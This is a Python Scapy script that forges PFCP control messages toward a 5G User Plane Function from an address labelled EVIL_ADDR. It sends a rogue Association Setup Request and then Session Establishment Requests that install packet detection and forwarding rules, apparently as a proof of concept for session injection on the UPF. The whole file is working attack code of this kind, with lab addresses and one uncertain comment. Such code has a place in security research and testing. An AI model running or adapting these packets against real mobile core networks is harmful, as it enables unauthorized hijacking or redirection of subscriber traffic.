from scapy.all import send, IP, UDP
from scapy.contrib.pfcp import *
import time
EVIL_ADDR = "10.100.200.66" 
UPF_ADDR  = "10.100.200.2"




def send_pfcp_association_setup_req():
    
    seq = 1

    node_id = IE_NodeId(id_type=0, ipv4=EVIL_ADDR)
    recovery_timestamp = IE_RecoveryTimeStamp(
        timestamp=int(time.time())
    )
    pfcp_msg = PFCP(
        version=1,
        message_type=5,
        seid=0,
        seq=seq
    )/node_id/recovery_timestamp

    packet = IP(src=EVIL_ADDR, dst=UPF_ADDR)/UDP(sport=8805, dport=8805)/pfcp_msg
    print("PFCP Association Setup packet:", packet.show())
    send(packet)
    print(f"PFCP Association Setup packet sent")



def send_pfcp_session_establishment_req():
    seid = 0x0000000000C0FFEE
    seq = 1

    node_id = IE_NodeId(id_type=0, ipv4=EVIL_ADDR)
    cp_f_seid = IE_FSEID(seid=seid, v4=1, ipv4=EVIL_ADDR)

    create_far = IE_CreateFAR(
        IE_list=[
            IE_FAR_Id(id=1),
            IE_ApplyAction(FORW=1),
            IE_ForwardingParameters(
                IE_list=[
                    IE_DestinationInterface(interface=1) 
                ]
            ),
        ]

    )

    create_pdr = IE_CreatePDR(
        IE_list=[
            IE_PDR_Id(id=1),
            IE_Precedence(precedence=255),
            IE_PDI(
                IE_list=[
                    IE_SourceInterface(interface=1),
                    IE_FTEID(         # not sure if this is correct
                        TEID=0x11111111,
                        #ipv4=UPF_ADDR,
                        ipv4="1.1.1.1",
                        V4=1,
                    ),
                    
                ]
            ),
            IE_FAR_Id(id=1),
        ]
    )

    pfcp_msg = PFCP(
        version=1,
        message_type=50,
        seid=seid,
        seq=seq
    )/node_id/cp_f_seid/create_pdr/create_far

    packet = IP(src=EVIL_ADDR, dst=UPF_ADDR)/UDP(sport=8805, dport=8805)/pfcp_msg
    print("PFCP Session Establishment packet:", packet.show())
    send(packet)
    print(f"PFCP Session Establishment packet sent")




def send_pfcp_session_establishment_test():
    src_ip="10.100.200.66"
    dst_ip="10.100.200.2"
    seid=0xC0FFEE
    sport=8805
    dport=8805
    teid=0x11111111
    ue_ip="1.1.1.1"
    network_instance="internet"
    seq = int(time.time()) % 256

    pfcp_msg = PFCP(
        version=1,
        message_type=50,
        seid=seid,
        seq=seq
    ) / \
    IE_NodeId(id_type=0, ipv4=src_ip) / \
    IE_FSEID(seid=seid, v4=1, ipv4=src_ip) / \
    IE_CreatePDR(IE_list=[
        IE_PDR_Id(id=1),
        IE_Precedence(precedence=255),
        IE_PDI(IE_list=[
            IE_SourceInterface(interface=1),
            IE_NetworkInstance(instance=network_instance),
            IE_FTEID(TEID=teid, V4=1, ipv4=ue_ip)
        ]),
        IE_FAR_Id(id=1)
    ]) / \
    IE_CreateFAR(IE_list=[
        IE_FAR_Id(id=1),
        IE_ApplyAction(FORW=1),
        IE_ForwardingParameters(IE_list=[
            IE_DestinationInterface(interface=1)
        ])
    ])

    pkt = IP(src=src_ip, dst=dst_ip)/UDP(sport=sport, dport=dport)/pfcp_msg

    print(f"Sending PFCP Session Establishment Request Test")
    pkt.show()
    send(pkt)
    print("Packet sent.")


send_pfcp_association_setup_req()
time.sleep(0.5)
send_pfcp_session_establishment_test()